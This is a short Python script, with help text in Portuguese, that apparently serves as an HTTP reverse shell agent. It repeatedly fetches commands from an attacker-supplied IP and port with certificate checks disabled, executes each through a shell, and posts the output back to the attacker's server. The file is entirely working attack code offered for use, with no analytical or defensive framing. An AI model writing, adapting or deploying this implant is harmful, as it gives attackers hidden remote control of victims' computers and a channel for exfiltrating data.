import requests as r
from subprocess  import Popen, PIPE, STDOUT
from time import sleep
import argparse as ap
from requests.packages.urllib3.exceptions import InsecureRequestWarning
r.packages.urllib3.disable_warnings(InsecureRequestWarning)

def connect(url, port, enc):
    while True:
        try:
            req = r.get(url, verify=False)
            command = req.text
            if 'terminate' in command:
                return False
            else:
                cmd =  Popen(command, shell=True, stdout=PIPE, stderr=STDOUT)
                r.post(url=url, data=cmd.stdout.read(), verify=False)
        except KeyboardInterrupt:
            exit(0)
        sleep(1)

if __name__ == '__main__':
    parser = ap.ArgumentParser()
    parser.add_argument('-i', '--ip', help='O endereço IP do atacante.', required=True)
    parser.add_argument('-p', '--port', help='A porta do atacante.', required=True)
    parser.add_argument('-s', '--ssl', help='Use esta opção caso queira usar SSL/TLS.', 
        action='store_true')

    args = parser.parse_args()

    if args.port == 443:
        url = 'https://'+args.ip+'/'
    elif args.port != 443 and args.ssl:
        url = 'https://'+args.ip+':'+args.port+'/'
    else:
        url = 'http://'+args.ip+':'+args.port+'/'

    connect(url, args.port, args.ssl)
